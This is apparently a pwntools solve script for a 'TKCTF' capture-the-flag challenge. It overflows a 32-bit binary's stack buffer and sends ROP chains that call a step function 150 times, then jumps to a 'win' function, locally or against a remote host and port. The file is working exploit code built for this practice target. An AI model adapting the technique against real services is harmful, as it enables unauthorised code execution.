#!/usr/bin/env python3
from pwn import *

## something I need to do for TKCTF
ROOT = os.path.abspath(os.path.dirname(__file__))
bin = os.path.join(ROOT, "../docker/target")

###Address I will need (address will change everytime you gcc the ymca.c) 
pop1 = p32(0x0804901e) #: pop ebx; ret; 
steps_addr = p32(0x080492a7) # address of direction function
win = p32(0x08049421)
popall = p32(0x08049206)

##List of array and steps
# Right Arrow steps
right_arrow_steps = [
    1, 10, 12, 14, 15, 16, 18, 24, 26, 28, 29, 30, 36, 38, 44, 46, 48, 49, 50, 
    52, 62, 74, 77, 79, 80, 81, 87, 88, 97, 99, 102, 110, 111, 112, 117, 120, 
    121, 124, 126, 129, 136, 137, 138, 143
]

# Left Arrow steps
left_arrow_steps = [
    2, 11, 17, 19, 21, 22, 23, 25, 35, 37, 39, 41, 42, 43, 45, 51, 53, 55, 56, 
    57, 63, 70, 72, 75, 83, 84, 85, 90, 93, 94, 101, 104, 106, 107, 108, 114, 
    115, 128, 131, 133, 134, 140, 141, 147
]

# Up Arrow steps
up_arrow_steps = [4, 6, 7, 32, 34, 58, 60, 73, 86, 91, 98, 105, 113, 118, 122, 125, 132, 135, 142]

# Down Arrow steps
down_arrow_steps = [3, 5, 8, 9, 31, 33, 59, 61, 71, 78, 82, 89, 95, 100, 109, 116, 127, 139, 144]

# Left and Right steps
left_and_right_steps = [31, 33, 64, 65, 68, 69, 76, 96, 103, 123, 130, 145, 146]

# Down and Up steps
down_and_up_steps = [13, 20, 27, 40, 47, 54, 66, 67, 92, 119]


# Buffer overflow size
buff = cyclic(76)
payload = []

def create_chain(num):
    """
    Creates a ROP chain for a given step number and appends it to the payload list.
    """
    global buff
    global payload

    tmp_payload = (
        buff
        + popall
        + p32(1)
        + p32(2)
        + p32(3)
        + p32(0xdeadbeef)
        + p32(5)
        + p32(6)
    )
    tmp_payload += steps_addr
    tmp_payload += pop1
    tmp_payload += p32(num)
    payload.append(tmp_payload)


def determine_step_type(i):
    """
    Determines the type of step for the given index and creates the corresponding chain.
    """
    found = False
    step_arrays = [
        (right_arrow_steps, 0),
        (left_arrow_steps, 1),
        (up_arrow_steps, 2),
        (down_arrow_steps, 3),
        (left_and_right_steps, 4),
        (down_and_up_steps, 5),
    ]
    for step_array, step_type in step_arrays:
        if i in step_array:
            create_chain(step_type)
            found = True
            break
    if not found:
        print(f"Index {i} not found in any step arrays.")


def build_payload():
    """
    Builds the complete payload by iterating through indices and determining their step types.
    """
    for i in range(150):
        determine_step_type(i)


def send_payloads(process_instance):
    """
    Sends each payload to the process and waits for a prompt.
    """
    for pl in payload:
        process_instance.recvuntil("Enter your Steps of the YMCA Song:")
        process_instance.sendline(pl)


def send_final_payload(process_instance):
    """
    Sends the final payload to trigger the 'win' function.
    """
    global buff
    payload_final = (
        buff
        + popall
        + p32(1)
        + p32(2)
        + p32(3)
        + p32(0xdeadbeef)
        + p32(5)
        + p32(6)
    )
    payload_final += win
    process_instance.sendline(payload_final)


def main():
    """
    Main function to coordinate building, sending payloads, and interacting with the process.
    """
    # Build the payload
    build_payload()

    # Determine if running locally or remotely
    if "REMOTE" in os.environ:
        if "PORT" not in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        remote_host = os.environ.get("HOST", "localhost")
        remote_port = int(os.environ["PORT"])
        p = remote(remote_host, remote_port)
    else:
        b = os.path.abspath(bin)
        p = process(b, cwd=os.path.dirname(b))

    # Send payloads
    send_payloads(p)

    # Send the final payload
    send_final_payload(p)

    # Interact with the process
    p.interactive()

if __name__ == "__main__":
    main()

